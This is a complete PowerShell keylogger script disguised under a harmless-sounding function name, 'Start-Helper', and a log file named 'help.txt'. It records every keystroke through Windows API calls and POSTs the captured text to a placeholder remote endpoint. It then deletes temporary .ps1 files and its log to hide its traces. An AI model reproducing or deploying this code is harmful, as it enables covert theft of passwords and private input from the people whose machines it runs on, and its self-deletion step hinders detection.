$TimesToRun = 2					# How many successful runs to achieve.
$RunTimeP = 0.5					# Runtime in minutes for each run.
$endpoint = "ADDRESS_TO_POST_LOGS_TO"		# Address to send the file to.

# Requires -Version 2
function Start-Helper($Path = "$env:temp\help.txt") 
{
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
  New-Item -Path $Path -ItemType File -Force

  $successfulRuns = 0

  try {
    while ($successfulRuns -lt $TimesToRun) {
      $TimeStart = Get-Date
      $TimeEnd = $TimeStart.AddMinutes($RunTimeP)

      while ($TimeNow -le $TimeEnd) {
        Start-Sleep -Milliseconds 40
        $fileCreated = $false

        for ($ascii = 9; $ascii -le 254; $ascii++) {
          $state = $API::GetAsyncKeyState($ascii)

          if ($state -eq -32767) {
            $null = [console]::CapsLock

            $virtualKey = $API::MapVirtualKey($ascii, 3)

            $kbstate = New-Object Byte[] 256
            $checkkbstate = $API::GetKeyboardState($kbstate)

            $mychar = New-Object -TypeName System.Text.StringBuilder

            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

            if ($success) 
            {
              [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::UTF8) 
              $fileCreated = $true  # File is created.
            }
          }
        }

        $TimeNow = Get-Date
      }

      if ((Get-Content -Path $Path) -match '\S') {
        Invoke-WebRequest -Uri $endpoint -Method POST -ContentType 'text/plain' -InFile $Path
        Remove-Item -Path $Path -Force
        $successfulRuns++
      }

      New-Item -Path $Path -ItemType File -Force
    }
  }
  finally
  {
        Remove-Item -Path $env:temp\*.ps1 -Force
        Remove-Item -Path $Path -Force
    exit 1
  }
}

Start-Helper

